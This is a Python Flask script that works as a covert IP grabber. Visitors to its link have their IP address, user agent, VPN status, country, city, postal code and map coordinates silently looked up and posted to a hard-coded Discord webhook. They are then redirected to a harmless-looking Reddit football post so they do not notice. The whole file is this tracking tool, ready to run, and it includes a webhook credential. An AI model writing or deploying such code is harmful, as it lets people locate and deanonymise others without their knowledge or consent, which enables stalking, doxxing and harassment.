from flask import Flask, request, redirect
import requests
import json
import datetime

app = Flask(__name__)

DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1427010775163080868/6Uaf91MUBd4GO3eYSf4y3i0VZkKQh0_pFQFO7H8M42IKWwYQmEkNcisypFHTmvTClpoS"

def get_visitor_info(ip, user_agent):
    # Use ipapi.co for IP details
    ipapi_url = f"https://ipapi.co/{ip}/json/"
    geoip_url = f"https://json.geoiplookup.io/{ip}"

    details = requests.get(ipapi_url).json()
    vpnconn = requests.get(geoip_url).json()

    vpn = "Yes" if vpnconn.get("connection_type") == "Corporate" else "No"

    now_utc = datetime.datetime.utcnow()

    info = {
        "ip": ip,
        "user_agent": user_agent,
        "vpn": vpn,
        "country": details.get("country_name", "Unknown"),
        "countryCode": details.get("country_code", "xx").lower(),
        "region": details.get("region", ""),
        "city": details.get("city", ""),
        "zip": details.get("postal", ""),
        "lat": details.get("latitude", 0),
        "lon": details.get("longitude", 0),
        "date": now_utc.strftime("%d/%m/%Y"),
        "time": now_utc.strftime("%H:%M:%S"),
    }
    return info

def send_to_discord(info):
    flag_url = f"https://countryflagsapi.com/png/{info['countryCode']}"

    ip_city = f"{info['ip']} ({info['city'] if info['city'] else 'Unknown City'})"

    embed = {
        "username": "hexdtz",  # Custom bot name as you requested
        "avatar_url": flag_url,
        "embeds": [{
            "title": f"Visitor From {info['country']}",
            "color": 39423,
            "fields": [
                {"name": "IP & City", "value": ip_city, "inline": True},
                {"name": "VPN?", "value": info["vpn"], "inline": True},
                {"name": "Useragent", "value": info["user_agent"]},
                {"name": "Country/CountryCode", "value": f"{info['country']}/{info['countryCode'].upper()}", "inline": True},
                {"name": "Region | City | Zip", "value": f"[{info['region']} | {info['city']} | {info['zip']}](https://www.google.com/maps/search/?api=1&query={info['lat']},{info['lon']} 'Google Maps Location (+/- 750M Radius)')", "inline": True},
            ],
            "footer": {
                "text": f"{info['date']} {info['time']}",
                "icon_url": "https://e7.pngegg.com/pngimages/766/619/png-clipart-emoji-alarm-clocks-alarm-clock-time-emoticon.png"
            }
        }]
    }

    headers = {"Content-Type": "application/json"}
    requests.post(DISCORD_WEBHOOK_URL, data=json.dumps(embed), headers=headers)

@app.route('/')
def index():
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    user_agent = request.headers.get('User-Agent', 'Unknown')

    info = get_visitor_info(ip, user_agent)
    send_to_discord(info)

    # Redirect to your chosen URL
    return redirect("https://www.reddit.com/r/football/comments/y8xqif/how_to_be_better_in_football_in_a_fast_time/")

if __name__ == "__main__":
    app.run(port=8080)
